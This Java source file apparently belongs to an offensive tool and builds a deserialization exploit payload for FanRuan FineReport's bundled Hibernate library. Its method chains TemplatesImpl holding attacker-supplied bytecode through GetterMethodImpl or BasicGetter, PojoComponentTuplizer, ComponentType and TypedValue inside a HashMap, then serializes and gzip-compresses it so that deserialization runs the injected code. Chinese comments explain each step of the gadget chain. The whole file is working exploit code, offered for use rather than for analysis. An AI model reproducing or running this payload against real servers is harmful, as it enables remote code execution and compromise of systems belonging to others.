package com.example.frchannel.payload;

import com.fr.third.org.hibernate.engine.spi.TypedValue;
import com.fr.third.org.hibernate.tuple.component.AbstractComponentTuplizer;
import com.fr.third.org.hibernate.type.Type;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;

public class Hibernate {
    public static byte[] getPayload(byte[] bytes) throws Exception {
        Class<?> componentTypeClass             = Class.forName("com.fr.third.org.hibernate.type.ComponentType");
        Class<?> pojoComponentTuplizerClass     = Class.forName("com.fr.third.org.hibernate.tuple.component.PojoComponentTuplizer");
        Class<?> abstractComponentTuplizerClass = Class.forName("com.fr.third.org.hibernate.tuple.component.AbstractComponentTuplizer");


        // 生成包含恶意类字节码的 TemplatesImpl 类
        TemplatesImpl tmpl   = utils.getTeml(bytes);
        Method method = TemplatesImpl.class.getDeclaredMethod("getOutputProperties");

        Object getter;
        try {
            // 创建 GetterMethodImpl 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法
            Class<?>       getterImpl  = Class.forName("com.fr.third.org.hibernate.property.access.spi.GetterMethodImpl");
            Constructor<?> constructor = getterImpl.getDeclaredConstructors()[0];
            constructor.setAccessible(true);
            getter = constructor.newInstance(null, null, method);
        } catch (Exception ignored) {
            // 创建 BasicGetter 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法
            Class<?>       basicGetter = Class.forName("com.fr.third.org.hibernate.property.BasicPropertyAccessor$BasicGetter");
            Constructor<?> constructor = basicGetter.getDeclaredConstructor(Class.class, Method.class, String.class);
            constructor.setAccessible(true);
            getter = constructor.newInstance(tmpl.getClass(), method, "outputProperties");
        }

        Object getters = Array.newInstance(getter.getClass(), 1);
        Array.set(getters, 0, getter);

        // 创建 PojoComponentTuplizer 实例，用来触发 Getter 方法
        AbstractComponentTuplizer tuplizer = (AbstractComponentTuplizer) utils.createInstanceUnsafely(pojoComponentTuplizerClass);

        // 反射将 BasicGetter 写入 PojoComponentTuplizer 的成员变量 getters 里
        Field field = abstractComponentTuplizerClass.getDeclaredField("getters");
        field.setAccessible(true);
        field.set(tuplizer, getters);

        // 创建 ComponentType 实例，用来触发 PojoComponentTuplizer 的 getPropertyValues 方法
        Object type = utils.createInstanceUnsafely(componentTypeClass);

        // 反射将相关值写入，满足 ComponentType 的 getHashCode 调用所需条件
        utils.setFieldValue(type,"componentTuplizer",tuplizer);

        utils.setFieldValue(type,"propertySpan",1);

        utils.setFieldValue(type,"propertyTypes",new Type[]{(Type) type});

        // 创建 TypedValue 实例，用来触发 ComponentType 的 getHashCode 方法
        TypedValue typedValue = new TypedValue((Type) type, null);

        // 创建反序列化用 HashMap
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(typedValue, "123");

        // put 到 hashmap 之后再反射写入，防止 put 时触发
        utils.setFieldValue(typedValue,"value", tmpl);

        byte[] ser = utils.serialize(hashMap);
//        utils.unserialize(ser);
        byte[] payload = utils.GzipCompress(ser);
        return payload;

    }

}
